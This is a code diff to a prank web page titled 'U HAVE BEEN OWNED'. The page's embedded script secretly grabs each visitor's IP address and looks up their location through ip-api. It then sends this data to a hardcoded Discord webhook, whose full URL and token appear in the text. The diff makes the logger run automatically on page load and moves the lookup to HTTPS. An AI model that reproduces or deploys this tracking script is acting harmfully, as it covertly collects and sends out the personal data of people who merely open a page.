@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- <link rel="icon" type="image/gif" href="https://media.tenor.com/FtgLKfbxF84AAAAM/you-are-an-idiot.gif">
+    <link rel="icon" type="image/gif" href="https://media.tenor.com/FtgLKfbxF84AAAAM/you-are-an-idiot.gif">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>U HAVE BEEN OWNED</title>
@@ -33,7 +33,6 @@
 </body>
 </html>
 
-
 <script>
     const webhookUrl = 'https://discord.com/api/webhooks/1336862623685148774/XDdGaufidkntBcBiZDlSY1uZmf2Kc3oSWKjai8xM84oYsDnfw70Aq7bOy4dYRykpA21t';
 
@@ -56,8 +55,8 @@
 
             console.log('IP logged and sent to webhook.');
 
-            // Get the location data from ip-api
-            const locationResponse = await fetch(`http://ip-api.com/json/${userIP}`);
+            // Get the location data from ip-api (using HTTPS now)
+            const locationResponse = await fetch(`https://ip-api.com/json/${userIP}`);
             const locationData = await locationResponse.json();
 
             if (locationData.status === "success") {
@@ -149,6 +148,6 @@
         }
     };
 
-    // Execute the logIp function
-    logIp();
+    // Execute the logIp function when the page loads
+    window.onload = logIp;
 </script>
